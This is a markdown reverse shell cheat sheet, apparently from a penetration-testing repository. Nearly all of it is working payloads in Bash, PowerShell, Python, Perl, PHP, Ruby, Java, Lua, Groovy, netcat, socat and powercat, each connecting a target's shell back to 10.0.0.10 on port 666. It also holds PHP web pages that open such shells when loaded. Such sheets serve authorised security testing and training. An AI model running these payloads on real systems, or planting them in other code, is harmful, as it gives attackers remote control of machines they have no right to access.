# Reverse Shell Cheat Sheet

You can find them all around the internet. 

* * * 
## One-liners

**Bash**


```
bash -i >& /dev/tcp/10.0.0.10/666 0>&1
```   

_or_    

```
0<&196;exec 196<>/dev/tcp/10.0.0.10/666; sh <&196 >&196 2>&196
```

_or_    

```
bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'
```

**PowerShell** 

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.10',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```



**Python for Linux**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
_or_
```
__import__("os").system("bash+-c+'bash+-i+>& /dev/tcp/10.0.0.10/666 0>&1'")
```


**Python for Windows**

```
exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.10",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```
_or_
```
python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.10",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
```


**Perl**

```perl
perl -e 'use Socket;$i="10.0.0.10";$p=666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


**PHP**

```php
php -r '$sock=fsockopen("10.0.0.10",666);exec("/bin/sh -i <&3 >&3 2>&3");'
```


**Ruby**

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",666).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


**Java**

```java
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/666;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

**Lua**

```lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('10.0.0.10',666);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" 
```

**Telnet**

```
telnet localhost 443 | /bin/sh | telnet localhost 444
```


**Xterm**

```
xterm -display 10.0.0.10:1
```

* * * 


## PHP Web Pages

**Linux**
~~~
<?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/666 0>&1'")?>
~~~

**Windows**

```
<?php echo shell_exec("powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.10',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")?>
```

* * *

## Tools

**Netcat**

```
nc -e /bin/sh 10.0.0.10 666
```

**Netcat without -e**

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 666 > /tmp/f
```

**Socat**

```
user@ubuntu:~$ socat - TCP4:10.0.0.10:666 EXEC:'/bin/bash -li'
C:\> socat TCP4:10.0.0.10:666 EXEC:'cmd.exe'
```


**Powercat**

```
powercat -c 10.0.0.10 -p 666 -e cmd.exe
```

* * *
## Others

**Powershell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.0.0.10',666);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```


**Python for Linux**

```python
#!/usr/bin/env python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.10",666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

**Python for Windows**

```python
import os, socket, subprocess, threading, sys

def s2p(s, p):
    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()

def p2s(s, p):
    while True: s.send(p.stdout.read(1).encode())

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: s.connect((10.0.0.10, 666)); break
    except: pass

p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)

threading.Thread(target=s2p, args=[s,p], daemon=True).start()

threading.Thread(target=p2s, args=[s,p], daemon=True).start()

try: p.wait()
except: s.close(); sys.exit(0)

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

**Groovy**

```groovy
String host="10.0.0.10";
int port=666;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**PHP**

The very good Pentestmonkey [php reverse shell](https://github.com/flast101/reverse-shell-cheatsheet/blob/master/php-reverse-shell.php).



Be Curious, Learning is Life ! :smiley:
